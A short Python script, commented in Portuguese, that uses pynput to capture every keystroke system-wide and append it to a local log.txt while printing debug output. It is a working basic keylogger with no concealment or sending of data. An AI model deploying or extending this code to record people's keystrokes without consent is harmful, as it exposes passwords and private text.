from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

def on_press(key):
    print(f"[DEBUG] Tecla recebida no callback: {key}")  # <-- LOG NO TERMINAL

    try:
        char = key.char
        print(f"[DEBUG] Caracter detectado: {char}")      # <-- LOG NO TERMINAL
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(char)

    except AttributeError:
        print(f"[DEBUG] Tecla especial detectada: {key}") # <-- LOG NO TERMINAL
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                print(f"[DEBUG] Tecla ignorada: {key}")
                pass
            else:
                f.write(f" [{key}] ")

print("[DEBUG] Listener iniciado. Pressione teclas...")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
